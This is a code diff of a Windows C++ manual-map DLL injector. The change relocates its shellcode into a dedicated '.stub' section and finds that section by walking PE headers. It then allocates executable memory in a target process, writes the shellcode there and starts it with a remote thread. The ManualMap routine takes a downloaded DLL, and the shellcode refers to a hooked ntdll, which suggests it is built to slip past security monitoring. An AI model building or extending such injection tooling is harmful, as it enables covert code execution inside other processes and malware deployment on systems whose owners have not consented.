@@ -1,4 +1,4 @@
-//cl /EHsc /GS- /Oy .\main.cpp .\injection.cpp /link /OUT:main.exe
+//cl /EHsc /GS- /Oy /Zi .\main.cpp .\injection.cpp /link /OUT:main.exe /DEBUG /MAP
 /*
     /c               # compile only, no linking
     /GS-             # disable stack‑security cookies
@@ -11,7 +11,7 @@
 #include "injection.h"
 #include <winternl.h>
 
-#pragma comment(linker, "/SECTION:.stub,RWE")
+#pragma comment(linker, "/SECTION:.stub,RE")
 
 ///////////////////////////////////////////////////////////////////////////////
 BYTE* pSourceBase = nullptr;
@@ -27,8 +27,6 @@ DWORD peOffset = 0;
 
 ///////////////////////////////////////////////////////////////////////////////
 void* FindExportAddress(HMODULE hModule, const char* funcName);
-__declspec(noinline) void __stdcall shellcode();
-__declspec(noinline) void __cdecl ShellcodeEndMarker();
 ///////////////////////////////////////////////////////////////////////////////
 
 NTSTATUS SanityCheck()
@@ -311,11 +309,33 @@ NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll)
     norm("\n\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
     norm("\nCopying Shellcode in the target..");
 
-    void* vpStartAddressOfShellcode = &shellcode;
-    void* vpEndAddressOfShellcode = &ShellcodeEndMarker;
+    BYTE* exeBase = (BYTE*)GetModuleHandle(NULL);
+    auto dos  = (IMAGE_DOS_HEADER*)exeBase;
+    auto nt   = (IMAGE_NT_HEADERS*)(exeBase + dos->e_lfanew);
+    auto sec  = IMAGE_FIRST_SECTION(nt);
 
-    size_t shellcodeBlockSize = (uintptr_t)vpEndAddressOfShellcode - (uintptr_t)vpStartAddressOfShellcode;
+    void* vpStartAddressOfShellcode = nullptr;
+    size_t shellcodeBlockSize = 0;
+    IMAGE_SECTION_HEADER* stubSection = nullptr;
 
+    for(UINT i = 0; i != pFileHeader->NumberOfSections; ++i, ++sec)
+    {
+        if(sec->SizeOfRawData)
+        {
+            if(memcmp(sec->Name, ".stub", 5) == 0)
+            {
+                vpStartAddressOfShellcode = exeBase + sec->VirtualAddress;
+                shellcodeBlockSize = sec->Misc.VirtualSize;
+                stubSection = sec;
+                break;
+            }
+        }
+    }
+    if (!stubSection)
+    {
+        fuk("Could not find .stub section");
+        return 0;
+    } norm("\nStart location of ", CYAN"", stubSection->Name, RESET" is", CYAN" 0x", (uintptr_t)vpStartAddressOfShellcode, RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
     
     BYTE* pShellcodeTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, shellcodeBlockSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
     if(!pShellcodeTargetBase)
@@ -337,7 +357,7 @@ NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll)
 
     if(!WriteProcessMemory(hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, nullptr))
     {
-        fuk("Failed to copy the shellcode");
+        fuk("Failed to copy the shellcode ", GetLastError());
         delete[] pSourceBase;
         return 0;
     } norm("\nShellcode Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeTargetBase + shellcodeBlockSize), RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
@@ -349,6 +369,14 @@ NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll)
         fuk("Failed to create a thread shellcode ", GetLastError());
         return 0;
     } norm("\nThread id -> ", std::dec, CYAN"", ShellcodeThreadId);
+
+    // size_t OffsetToEntry = ((uintptr_t)&shellcode - (uintptr_t)exeBase) - stubSection->VirtualAddress;
+    // DWORD ShellcodeThreadId = 0;
+    // if(!CreateRemoteThread(hproc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pShellcodeTargetBase + OffsetToEntry), nullptr, 0, &ShellcodeThreadId))
+    // {
+    //     fuk("Failed to create a thread shellcode ", GetLastError());
+    //     return 0;
+    // } norm("\nThread id -> ", std::dec, CYAN"", ShellcodeThreadId);
     
     norm("\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
     #pragma endregion
@@ -427,9 +455,34 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 #pragma region Shellcode
 #pragma code_seg(push, ".stub")
 
-    __declspec(noinline) void __stdcall shellcode()
+    extern "C" __declspec(noinline) void __fastcall HelperSplitFilename(const WCHAR* full, SIZE_T fullLen, const WCHAR** outName, SIZE_T* outLen)
     {
+        SIZE_T i = fullLen;
+        while (i > 0)
+        {
+            WCHAR c = full[i - 1];
+            if (c == L'\\' || c == L'/') break;
+            --i;
+        }
+        *outName = full + i;
+        *outLen  = fullLen - i;
+    }
 
+    extern "C" __declspec(noinline) bool __fastcall isSame(const WCHAR* a, const WCHAR* b, SIZE_T len)
+    {
+        for (SIZE_T i = 0; i < len; i++)
+        {
+            WCHAR ca = a[i], cb = b[i];
+            // tolower for ASCII A–Z
+            if (ca >= L'A' && ca <= L'Z') ca += 32;
+            if (cb >= L'A' && cb <= L'Z') cb += 32;
+            if (ca != cb) return false;
+        }
+        return true;
+    }
+
+    extern "C" __declspec(noinline) void __stdcall shellcode()
+    {
         struct _LIBS
         {
             HMODULE hHookedNtdll;
@@ -495,34 +548,6 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         __debugbreak();
     }
-
-    __declspec(noinline) bool __fastcall isSame(const WCHAR* a, const WCHAR* b, SIZE_T len)
-    {
-        for (SIZE_T i = 0; i < len; i++)
-        {
-            WCHAR ca = a[i], cb = b[i];
-            // tolower for ASCII A–Z
-            if (ca >= L'A' && ca <= L'Z') ca += 32;
-            if (cb >= L'A' && cb <= L'Z') cb += 32;
-            if (ca != cb) return false;
-        }
-        return true;
-    }
-
-    __declspec(noinline) void __fastcall HelperSplitFilename(const WCHAR* full, SIZE_T fullLen, const WCHAR** outName, SIZE_T* outLen)
-    {
-        SIZE_T i = fullLen;
-        while (i > 0)
-        {
-            WCHAR c = full[i - 1];
-            if (c == L'\\' || c == L'/') break;
-            --i;
-        }
-        *outName = full + i;
-        *outLen  = fullLen - i;
-    }
-
-    __declspec(noinline) void __cdecl ShellcodeEndMarker(){ }           //MarkerFunction, starts with 'Z' to put it last in the stub
 
 #pragma code_seg(pop)
 #pragma endregion
